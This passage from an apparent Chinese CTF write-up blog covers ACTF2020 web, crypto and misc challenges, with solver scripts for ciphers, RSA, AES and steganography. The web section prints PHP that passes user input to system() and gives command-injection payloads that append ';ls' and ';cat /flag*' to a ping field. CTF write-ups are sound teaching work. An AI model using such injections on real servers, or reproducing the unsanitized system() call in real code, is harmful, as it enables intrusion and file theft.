<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyweb/easyweb.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="urla" class="fancybox"><img alt="urla" title="urla" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyweb/easyweb.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="simlple-exec"><a href="#simlple-exec" class="headerlink" title="simlple_exec"></a>simlple_exec</h2><ul>
<li>题目描述：-</li>
<li>考察点：命令执行、shell基础</li>
<li>难度：入门</li>
<li>分值：300</li>
<li>完成人数：9</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/simlple_exec/1.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="cataa" class="fancybox"><img alt="cataa" title="cataa" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/simlple_exec/1.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>点ping按钮会执行ping命令，应该是用了system函数，于是试了一下末尾加上<code>;cmd</code>执行命令</p>
<blockquote>
<p>127.0.0.1;ls<br>127.0.0.1;cat index.php </p>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'target'</span>])) &#123;</span><br><span class="line">	system(<span class="string">"ping -c 3 "</span>.$_POST[<span class="string">'target'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>什么过滤都没有，直接读flag即可：</p>
<blockquote>
<p>127.0.0.1;cat /flag*</p>
</blockquote>
<hr>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>密码学从入门到放弃</p>
<h2 id="classic0"><a href="#classic0" class="headerlink" title="classic0"></a>classic0</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>小Z用C语言编写了一个最简单的密码系统，里面都采用的是最简单的古典加密。但是他的源程序不幸泄露，聪明的你能否解读他采用的算法并进行解密？flag格式为actf{***}</p>
</blockquote>
</li>
<li><p>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic0/crypto-classic0.zip" target="_blank" rel="noopener">crypto-classic0.zip</a></p>
</li>
<li><p>考察点：逆向分析</p>
</li>
<li><p>难度：入门</p>
</li>
<li><p>分值：100</p>
</li>
<li><p>完成人数：11</p>
</li>
</ul>
<p>提示密码是生日，于是暴力解压缩包密码，得到<code>19990306</code>，解压出加密程序的代码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">25</span>] = ***</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		flag[i] -= <span class="number">3</span>;</span><br><span class="line">		flag[i] ^= <span class="number">0x7</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>,flag[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>不难，直接解密即可：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">'./cipher'</span>,<span class="string">'r'</span>)</span><br><span class="line">s=f.read()</span><br><span class="line">f.close()</span><br><span class="line">k=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    k+=chr((ord(i)^<span class="number">0x7</span>)+<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> k</span><br><span class="line"><span class="comment"># 'actf&#123;my_naive_encrytion&#125;'</span></span><br></pre></td></tr></table></figure></div>



<h2 id="classic1"><a href="#classic1" class="headerlink" title="classic1"></a>classic1</h2><ul>
<li>题目描述：维吉尼亚加密是极其经典的古典密码，flag格式为actf{}，明文中的字母均为小写。</li>
<li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1/crypto-classic1.zip" target="_blank" rel="noopener">crypto-classic1</a></li>
<li>考察点：维吉尼亚加密</li>
<li>难度：中等</li>
<li>分值：100</li>
<li>完成人数：8</li>
</ul>
<p>压缩包有密码，不过给了提示：</p>
<blockquote>
<p>哇，这里有压缩包的密码哦，于是我低下了头，看向了我的双手，试图从中找到某些规律<br>xdfv ujko98 edft54 xdfv pok,.; wsdr43</p>
</blockquote>
<p>我低头看了看键盘，照着提示按下一个个按键，意外地发现，我在键盘上画了6个〇</p>
<p>然鹅并不知道密码是啥<code>=_=</code>但是应该是六位，于是暴力破解，解出密码<code>circle</code>这谁猜得出a…</p>
<p>解开名为维吉尼亚的压缩包发现密文：</p>
<blockquote>
<p> SRLU{LZPL_S_UASHKXUPD_NXYTFTJT}</p>
</blockquote>
<p>查了查维吉尼亚，发现和凯撒差不多，也是rot，但是多了一个密钥，网上有无密钥的解法，但是好高端，各种数学公式，看不懂啊…</p>
<blockquote>
<p>维吉尼亚密码的密钥长度需要与明文长度相同，如果少于明文长度，则重复拼接直到相同</p>
</blockquote>
<p>于是遍历一边密钥只有一个字符(a-z)的加密结果，看看能有啥眉头不</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: s=<span class="string">'SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">   ...:     t=<span class="string">''</span></span><br><span class="line">   ...:     <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">   ...:         <span class="keyword">if</span> j <span class="keyword">in</span> string.uppercase:</span><br><span class="line">   ...:             t+=chr(((ord(j)-ord(<span class="string">'A'</span>)+i)%<span class="number">26</span>)+ord(<span class="string">'A'</span>))</span><br><span class="line">   ...:         <span class="keyword">else</span>:</span><br><span class="line">   ...:             t+=j</span><br><span class="line">   ...:     <span class="keyword">print</span> chr(ord(<span class="string">'A'</span>)+i),t</span><br><span class="line">   ...:        </span><br><span class="line"></span><br><span class="line">A SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;</span><br><span class="line">B TSMV&#123;MAQM_T_VBTILYVQE_OYZUGUKU&#125;</span><br><span class="line">C UTNW&#123;NBRN_U_WCUJMZWRF_PZAVHVLV&#125;</span><br><span class="line">D VUOX&#123;OCSO_V_XDVKNAXSG_QABWIWMW&#125;</span><br><span class="line">E WVPY&#123;PDTP_W_YEWLOBYTH_RBCXJXNX&#125;</span><br><span class="line">F XWQZ&#123;QEUQ_X_ZFXMPCZUI_SCDYKYOY&#125;</span><br><span class="line">G YXRA&#123;RFVR_Y_AGYNQDAVJ_TDEZLZPZ&#125;</span><br><span class="line">H ZYSB&#123;SGWS_Z_BHZOREBWK_UEFAMAQA&#125;</span><br><span class="line">I AZTC&#123;THXT_A_CIAPSFCXL_VFGBNBRB&#125;</span><br><span class="line">J BAUD&#123;UIYU_B_DJBQTGDYM_WGHCOCSC&#125;</span><br><span class="line">K CBVE&#123;VJZV_C_EKCRUHEZN_XHIDPDTD&#125;</span><br><span class="line">L DCWF&#123;WKAW_D_FLDSVIFAO_YIJEQEUE&#125;</span><br><span class="line">M EDXG&#123;XLBX_E_GMETWJGBP_ZJKFRFVF&#125;</span><br><span class="line">N FEYH&#123;YMCY_F_HNFUXKHCQ_AKLGSGWG&#125;</span><br><span class="line">O GFZI&#123;ZNDZ_G_IOGVYLIDR_BLMHTHXH&#125;</span><br><span class="line">P HGAJ&#123;AOEA_H_JPHWZMJES_CMNIUIYI&#125;</span><br><span class="line">Q IHBK&#123;BPFB_I_KQIXANKFT_DNOJVJZJ&#125;</span><br><span class="line">R JICL&#123;CQGC_J_LRJYBOLGU_EOPKWKAK&#125;</span><br><span class="line">S KJDM&#123;DRHD_K_MSKZCPMHV_FPQLXLBL&#125;</span><br><span class="line">T LKEN&#123;ESIE_L_NTLADQNIW_GQRMYMCM&#125;</span><br><span class="line">U MLFO&#123;FTJF_M_OUMBEROJX_HRSNZNDN&#125;</span><br><span class="line">V NMGP&#123;GUKG_N_PVNCFSPKY_ISTOAOEO&#125;</span><br><span class="line">W ONHQ&#123;HVLH_O_QWODGTQLZ_JTUPBPFP&#125;</span><br><span class="line">X POIR&#123;IWMI_P_RXPEHURMA_KUVQCQGQ&#125;</span><br><span class="line">Y QPJS&#123;JXNJ_Q_SYQFIVSNB_LVWRDRHR&#125;</span><br><span class="line">Z RQKT&#123;KYOK_R_TZRGJWTOC_MWXSESIS&#125;</span><br></pre></td></tr></table></figure></div>

<p>果然，当密钥是<code>I</code>的时候，字符串被加密成:</p>
<blockquote>
<p>AZTC{THXT_A_CIAPSFCXL_VFGBNBRB}</p>
</blockquote>
<p>隐隐能猜到<code>ACTF</code>,<code>VIGENERE</code>这两个单词<br>对比<code>ACTF</code>和<code>AZTC</code>，第2和第四位不同，但是<code>Z+3=C</code>，<code>C+3=F</code>，于是猜测密钥第二位应该是<code>I+3=L</code><br>再看一下密钥是纯<code>L</code>的加密结果:</p>
<blockquote>
<p> DCWF{WKAW_D_FLDSVIFAO_YIJEQEUE}</p>
</blockquote>
<p>于是验证了上述想法</p>
<blockquote>
<p>I AZTC{THXT_A_CIAPSFCXL_VFGBNBRB}<br>L DCWF{WKAW_D_FLDSVIFAO_YIJEQEUE}</p>
</blockquote>
<p>由于开头的<code>ACTF</code>和末位的<code>VIGENERE</code>都是隔一个字符就正确一个，于是猜测密钥只含<code>I</code>和<code>L</code></p>
<p>从上面那两个结果能凑齐FLAG了</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1/jie2.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="jie" class="fancybox"><img alt="jie" title="jie" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1/jie2.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>最后逐个凑了一下密钥，结果是：</p>
<blockquote>
<p>ililliliiililililiilil</p>
</blockquote>
<p>按理说应该是解密的，但是用这个密钥加密题目给的字符串就能出FLAG<br>至于为什么，我也不知道，可能因为加密解密是对称的？</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1//Picture1.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="ans" class="fancybox"><img alt="ans" title="ans" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-classic1//Picture1.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="rsa0"><a href="#rsa0" class="headerlink" title="rsa0"></a>rsa0</h2><ul>
<li>题目描述：看看rsa的资料，学学python吧，这种简单题绝对不卡你！flag格式为<code>actf{***}</code></li>
<li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-rsa0/crypto-rsa0.zip" target="_blank" rel="noopener">crypto-rsa0.zip</a></li>
<li>考察点：zip伪加密、RSA</li>
<li>难度：入门</li>
<li>分值：100</li>
<li>完成人数：6</li>
</ul>
<h3 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h3><p>将<code>rsa0.py</code> 文件对应的<code>0009</code> 改为 <code>0000</code></p>
<p>得到<code>e=65537</code></p>
<h3 id="rsa解密"><a href="#rsa解密" class="headerlink" title="rsa解密"></a>rsa解密</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">p = <span class="number">9018588066434206377240277162476739271386240173088676526295315163990968347022922841299128274551482926490908399237153883494964743436193853978459947060210411</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">7547005673877738257835729760037765213340036696350766324229143613179932145122130685778504062410137043635958208805698698169847293520149572605026492751740223</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">50996206925961019415256003394743594106061473865032792073035954925875056079762626648452348856255575840166640519334862690063949316515750256545937498213476286637455803452890781264446030732369871044870359838568618176586206041055000297981733272816089806014400846392307742065559331874972274844992047849472203390350</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">m = pow(c, d, p*q)</span><br><span class="line"></span><br><span class="line">print( number.long_to_bytes(m) )</span><br></pre></td></tr></table></figure></div>



<h2 id="baby-aes"><a href="#baby-aes" class="headerlink" title="baby aes"></a>baby aes</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>AES是一种十分高效安全的对称加密方式，在现代密码学中有着举足轻重的地位。小Z对此很放心，于是就写了一个脚本用AES加密，你能获得他的明文嘛？flag格式为<code>actf{***}</code></p>
</blockquote>
</li>
<li><p>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/crypto/crypto-aes/crypto-aes.zip" target="_blank" rel="noopener">crypto-aes.zip</a></p>
</li>
<li><p>考察点：数学? AES加密</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>分值：200</p>
</li>
<li><p>完成人数：2</p>
</li>
</ul>
<p><code>key</code>长32字节为两字节的随机数重复16次，<code>iv</code>长16字节</p>
<p>已知：输出<code>out</code>，<code>key</code>与<code>iv</code>异或的结果</p>
<p>由于<code>key</code>与<code>iv</code>长度不一样，<code>key</code>有16字节字节与0异或，还是其本身，因此可解出<code>key</code></p>
<p>由异或结果可解出<code>iv</code></p>
<p>解出<code>iv</code>后，直接<code>aes</code>解密即可</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">out = long_to_bytes(<span class="number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span>)</span><br><span class="line"></span><br><span class="line">key = out[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">xor_res = out[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">iv = bytes_to_long(xor_res)^bytes_to_long(key[<span class="number">16</span>:])</span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line"></span><br><span class="line">aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line"></span><br><span class="line">out = <span class="string">b'\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p'</span></span><br><span class="line"></span><br><span class="line">flag = aes.decrypt(out)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>签到题都没做出来，呜呜呜</p>
<h2 id="白给"><a href="#白给" class="headerlink" title="白给"></a>白给</h2><ul>
<li><p>题目描述：远在天边，近在眼前。仔细找找吧~</p>
</li>
<li><p>考察点：base64隐写术</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>分值：100</p>
</li>
<li><p>完成人数：12</p>
</li>
</ul>
<p>base64隐写…直接跑脚本解密</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./base64decode.py ./ComeOn\!.txt</span></span><br><span class="line">...</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(sys.argv[<span class="number">1</span>], <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">'0'</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure></div>



<h2 id="Music-for-free"><a href="#Music-for-free" class="headerlink" title="Music for free"></a>Music for free</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>zzw喜欢听音乐，可是他不是VIP，也不想花钱下载音乐，可是你却在无意中发现了他拥有大量的音乐资源。想想他是怎么做到的？<br>格式为：actf{xxxxxx}，flag均是小写</p>
</blockquote>
</li>
<li><p>考察点：文件修复</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>分值：100</p>
</li>
<li><p>完成人数：5</p>
</li>
</ul>
<p>给了一个<code>m4a</code>文件但是用<code>file</code>没识别出来</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> file vip.m4a </span></span><br><span class="line">vip.m4a: data</span><br></pre></td></tr></table></figure></div>

<p>于是查了一下<code>m4a</code> 文件头是：</p>
<blockquote>
<p><code>00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00</code></p>
</blockquote>
<p>而这个文件的文件头却是：</p>
<blockquote>
<p><code>a1 a1 a1 b9 c7 d5 d8 d1 cc d1 95 93 a1 a1 a1 a1</code></p>
</blockquote>
<p>应该是和<code>0xa1</code>异或了，解出来<code>m4a</code>然后播放，原来是道听力题…..</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/music/m4a.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="m4a" class="fancybox"><img alt="m4a" title="m4a" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/music/m4a.png" src="/img/loading.gif" class="lazyload"></a></p>
<h2 id="SWP"><a href="#SWP" class="headerlink" title="SWP"></a>SWP</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>简单的流量题。<br>格式为：actf{xxxxxx}，flag均是小写</p>
</blockquote>
</li>
<li><p>考察点：流量分析</p>
</li>
<li><p>难度：简单</p>
</li>
<li><p>分值：100</p>
</li>
<li><p>完成人数：8</p>
</li>
</ul>
<p>用<code>wireshark</code>打开流量包，搜索<code>flag</code>发现压缩包一个</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/swp/swp.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="swp" class="fancybox"><img alt="swp" title="swp" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/misc/swp/swp.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>尝试解压，发现有密码，但是直接用<code>binwalk</code>就能解出来<code>flag</code>文件</p>
<p>是个<code>elf64</code>，直接搜索字符串就有flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> rabin2 -zz flag| grep &#123;</span></span><br><span class="line">17  0x000006d9 0x000006d9 42  43 ascii  actf&#123;c5558bcf-26da-4f8b-b181-b61f3850b9e5&#125;</span><br></pre></td></tr></table></figure></div>

<p>并不知道这题给的swp文件有啥用…</p>
<h2 id="喵咪"><a href="#喵咪" class="headerlink" title="喵咪"></a>喵咪</h2><ul>
<li>题目描述：好可爱的小猫咪！</li>
<li>考察点：outguess隐写术</li>
<li>难度：入门</li>
<li>分值：200</li>
<li>完成人数：7</li>
</ul>
<p>根据提示百度了下，是outguess加密，直接解密的话报错了，看来是需要key</p>
<p>windows下查看图片属性，备注里有着<strong>社会主义核心价值观</strong>，送去<a href="http://ctf.ssleye.com/cvencode.html" target="_blank" rel="noopener">这里</a>解码，解得<code>abc</code></p>
<p>用key解密即可：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./outguess -r mmm.jpg -k abc -t a.txt ; cat a.txt</span></span><br><span class="line">Reading mmm.jpg....</span><br><span class="line">Extracting usable bits:   17550 bits</span><br><span class="line">Steg retrieve: seed: 93, len: 23</span><br><span class="line">ACTF&#123;gue33_Gu3Ss!2020&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>假装自己是一个web题目。</p>
<p>做完这题以后请正确加密。</p>
<p>格式为：afctf{xxxxxx}</p>
</blockquote>
</li>
